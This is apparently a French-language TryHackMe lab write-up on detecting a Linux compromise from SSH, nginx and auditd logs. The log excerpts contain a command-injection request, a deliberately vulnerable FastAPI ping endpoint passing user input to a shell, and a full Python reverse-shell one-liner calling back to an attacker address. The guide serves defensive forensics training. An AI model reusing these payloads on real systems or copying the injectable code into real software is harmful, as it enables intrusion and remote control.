---
title: Linux Threat Detection 1
tags: [TryHackMe, Intermédiaire, Défense, Analyse de logs, Linux]
style: border
color: thm
comments: false
description: Analyser les logs d'une machine Linux pour trouver des traces de compromission
---
Lien vers l'épreuve : <https://tryhackme.com/room/linuxthreatdetection1>

![Medium](https://img.shields.io/badge/Difficulté-Intermédiaire-orange?logo=tryhackme)

## Sommaire <!-- omit in toc -->

* [Accès initial via {% include dictionary.html word="SSH" %}](#accès-initial-via--include-dictionaryhtml-wordssh-)
* [Détecter des attaques {% include dictionary.html word="SSH" %}](#détecter-des-attaques--include-dictionaryhtml-wordssh-)
* [Accès initial via Services](#accès-initial-via-services)
* [Détecté une faille dans un service](#détecté-une-faille-dans-un-service)

## Accès initial via {% include dictionary.html word="SSH" %}

### Quand est-ce que l'utilisateur "ubuntu" s'est connecté en {% include dictionary.html word="SSH" %} pour la première fois ? <!-- omit in toc -->

Les logs du service {% include dictionary.html word="SSH" %} sont disponibles dans le fichier `/var/log/auth.log`.

```bash
grep sshd /var/log/auth.log | grep -i ubuntu | grep -i accepted | head
```

{% capture spoil %}

```txt
[...expurgé pour brièveté...]
[...expurgé...]T09:09:06.968340+00:00 ip-10-10-249-101 sshd[839]: Accepted publickey for ubuntu from 10.9.254.186 port 50136 ssh2: RSA SHA256:krhp4o9yYOyVKmAd7PAsdHrKQGJtjIQjt4w0K9R4kXg
[...expurgé...]T09:09:07.320625+00:00 ip-10-10-249-101 sshd[841]: Accepted publickey for ubuntu from 10.9.254.186 port 50142 ssh2: RSA SHA256:krhp4o9yYOyVKmAd7PAsdHrKQGJtjIQjt4w0K9R4kXg
```

{% endcapture %}
{% include elements/spoil.html %}

>Les premières lignes issues des logs ne donnent pas l'année

L'utilisateur "ubuntu" utilise une clé {% include dictionary.html word="SSH" %} pour se connecter.

## Détecter des attaques {% include dictionary.html word="SSH" %}

### Quand a débuté la brute force sur les mots de passe {% include dictionary.html word="SSH" %} ? <!-- omit in toc -->

La recherche d'événements en échec (*fail*) met en avant la tentative d'attaque par force brute.

```bash
grep -i sshd /var/log/auth.log | grep -i password | grep -i fail | head -5
```

{% capture spoil %}

```txt
[...expurgé...]T16:34:04.201269+00:00 thm-vm sshd[18432]: Failed password for root from 197.39.195.136 port 47942 ssh2
[...expurgé...]T16:38:47.168117+00:00 thm-vm sshd[18479]: Failed password for invalid user sol from 193.32.162.145 port 46702 ssh2
[...expurgé...]T16:39:54.526886+00:00 thm-vm sshd[18482]: Failed password for root from 193.46.255.33 port 47526 ssh2
[...expurgé...]T16:39:58.381234+00:00 thm-vm sshd[18482]: Failed password for root from 193.46.255.33 port 47526 ssh2
[...expurgé...]T16:40:02.099936+00:00 thm-vm sshd[18482]: Failed password for root from 193.46.255.33 port 47526 ssh2
```

{% endcapture %}
{% include elements/spoil.html %}

### Quels sont les 4 utilisateurs que le botnet a essayé de forcer ? <!-- omit in toc -->

```bash
grep -i sshd /var/log/auth.log | grep -Eoi "failed password for (invalid user )?\w+" | sort | uniq -c
```

>Cette commande permet de trouver les lignes pour lesquelles une tentative de connexion est en échec, que l'utilisateur existe ou non sur la machine, et compte les occurrences pour faciliter le traitement des informations.

{% capture spoil %}

```txt
5 Failed password for invalid user [...expurgé...]
1 Failed password for invalid user [...expurgé...]
5 Failed password for invalid user [...expurgé...]
47 Failed password for [...expurgé...]
```

{% endcapture %}
{% include elements/spoil.html %}

### Enfin, quelle adresse IP est parvenue à forcer l'utilisateur root ? <!-- omit in toc -->

```bash
grep -i sshd /var/log/auth.log | grep -i "accepted .* root"
```

{% capture spoil %}

```txt
2025-08-21T17:10:08.113644+00:00 thm-vm sshd[16876]: Accepted password for root from [...expurgé...] port 51555 ssh2
```

{% endcapture %}
{% include elements/spoil.html %}

## Accès initial via Services

### Quel est le chemin vers le fichier Python que l'attaquant a essayé d'ouvrir ? <!-- omit in toc -->

```bash
grep -i "\.py" /var/log/nginx/access.log
```

>Cette commande recherche l'extension `.py` d'un fichier Python. Le backslash permet de ne pas interpréter le point comme "n'importe quel caractère" mais bien comme le symbole *point*

{% capture spoil %}

```txt
10.14.105.255 - - [26/Aug/2025:20:10:49 +0000] "GET /ping?host=;cat+/[...expurgé...].py HTTP/1.1" 200 330 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
```

{% endcapture %}
{% include elements/spoil.html %}

### En regardant dans le fichier, quel flag est visible ? <!-- omit in toc -->

```bash
cat /[...expurgé...].py
```

{% capture spoil %}

```py
"""
Welcome to TryPingMe app (version 0.0.1)!
This is just a draft, sorry for the bad code

Dev Team
"""


import subprocess

import uvicorn
from fastapi import FastAPI
from fastapi.responses import HTMLResponse

app = FastAPI()


@app.get("/ping", response_class=HTMLResponse)
def ping(host: str):

    # TODO: Add security checks
    # THM{[...expurgé...]}
    cmd = f"ping -c 2 {host}"
    result = subprocess.check_output(cmd, shell=True)
    response = f"<h3>Checking the host: {host}</h3>\n"
    response += f"<pre>{result.decode()}</pre>"
    return response


if __name__ == "__main__":
    uvicorn.run(app)
```

{% endcapture %}
{% include elements/spoil.html %}

## Détecté une faille dans un service

### Quel est le {% include dictionary.html word="PPID" %} de la commande `whoami` suspecte ? <!-- omit in toc -->

L'outil `ausearch` permettra de retrouver les occurrences des différentes commandes.

```bash
ausearch -i -x whoami
```

{% capture spoil %}

```txt
----
type=PROCTITLE msg=audit(08/26/25 20:09:49.742:158) : proctitle=whoami 
type=CWD msg=audit(08/26/25 20:09:49.742:158) : cwd=/opt/trypingme 
type=EXECVE msg=audit(08/26/25 20:09:49.742:158) : argc=1 a0=whoami 
type=SYSCALL msg=audit(08/26/25 20:09:49.742:158) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x57c312f7e650 a1=0x57c312f7e5d8 a2=0x57c312f7e5e8 a3=0x8 items=2 ppid=[...expurgé...] pid=1020 auid=unset uid=ubuntu gid=ubuntu euid=ubuntu suid=ubuntu fsuid=ubuntu egid=ubuntu sgid=ubuntu fsgid=ubuntu tty=(none) ses=unset comm=whoami exe=/usr/bin/whoami subj=unconfined key=exec
```

{% endcapture %}
{% include elements/spoil.html %}

### En remontant l'arborescence, quel est le {% include dictionary.html word="PID" %} de l'application TryPing Me ? <!-- omit in toc -->

Première étape, trouver le processus dont le {% include dictionary.html word="PID" %} est celui précédemment trouvé.

```bash
ausearch -i --pid [...expurgé...]
```

{% capture spoil %}

```txt
----
type=PROCTITLE msg=audit(08/26/25 20:09:49.738:156) : proctitle=/bin/sh -c ping -c 2 ;whoami 
type=CWD msg=audit(08/26/25 20:09:49.738:156) : cwd=/opt/trypingme 
type=EXECVE msg=audit(08/26/25 20:09:49.738:156) : argc=3 a0=/bin/sh a1=-c a2=ping -c 2 ;whoami 
type=SYSCALL msg=audit(08/26/25 20:09:49.738:156) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x7ef5401797b0 a1=0x7ef53e636870 a2=0x7ffeb1260660 a3=0x8 items=2 ppid=[...expurgé...] pid=1018 auid=unset uid=ubuntu gid=ubuntu euid=ubuntu suid=ubuntu fsuid=ubuntu egid=ubuntu sgid=ubuntu fsgid=ubuntu tty=(none) ses=unset comm=sh exe=/usr/bin/dash subj=unconfined key=exec
```

{% endcapture %}
{% include elements/spoil.html %}

Et répéter l'opération jusqu'à trouver le processus correspondant à `TryPingMe`

```bash
ausearch -i --pid [...expurgé...]
```

{% capture spoil %}

```txt
----
type=PROCTITLE msg=audit(08/26/25 20:07:48.305:88) : proctitle=/usr/bin/python3 /opt/trypingme/main.py 
type=CWD msg=audit(08/26/25 20:07:48.305:88) : cwd=/opt/trypingme 
type=EXECVE msg=audit(08/26/25 20:07:48.305:88) : argc=2 a0=/usr/bin/python3 a1=/opt/trypingme/main.py 
type=SYSCALL msg=audit(08/26/25 20:07:48.305:88) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x640a321acbf0 a1=0x640a321ae620 a2=0x640a321aff90 a3=0x640a321abb90 items=2 ppid=1 pid=[...expurgé...] auid=unset uid=ubuntu gid=ubuntu euid=ubuntu suid=ubuntu fsuid=ubuntu egid=ubuntu sgid=ubuntu fsgid=ubuntu tty=(none) ses=unset comm=python3 exe=/usr/bin/python3.12 subj=unconfined key=exec
```

{% endcapture %}
{% include elements/spoil.html %}

### Quel programme l'attaquant a utilisé pour ouvrir un *{% include dictionary.html word="reverse-shell" %}* ? <!-- omit in toc -->

La réponse se trouve en analysant les processus dont le parent est celui précédemment trouvé.

```bash
ausearch -i --ppid [...expurgé...]
```

{% capture spoil %}

```txt
[...expurgé pour brièveté...]
----
type=PROCTITLE msg=audit(08/26/25 20:11:16.022:167) : proctitle=/bin/sh -c ping -c 2 ;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10. 
type=CWD msg=audit(08/26/25 20:11:16.022:167) : cwd=/opt/trypingme 
type=EXECVE msg=audit(08/26/25 20:11:16.022:167) : argc=3 a0=/bin/sh a1=-c a2=ping -c 2 ;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.105.255",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' 
type=SYSCALL msg=audit(08/26/25 20:11:16.022:167) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x7ef5401797b0 a1=0x7ef53e6368d0 a2=0x7ffeb1260660 a3=0x8 items=2 ppid=[...expurgé...] pid=1029 auid=unset uid=ubuntu gid=ubuntu euid=ubuntu suid=ubuntu fsuid=ubuntu egid=ubuntu sgid=ubuntu fsgid=ubuntu tty=(none) ses=unset comm=sh exe=/usr/bin/dash subj=unconfined key=exec
```

{% endcapture %}
{% include elements/spoil.html %}

L'attaquant a donc utilisé un reverse shell Python.

---
L'analyse de logs Linux s'étend sur 2 autres box. Pour passer à la suivante :

{% include elements/button.html link="/Hackministrateur/comptes-rendus/LinuxThreatDetection2" text="Epreuve suivante" style="outline-info" %}
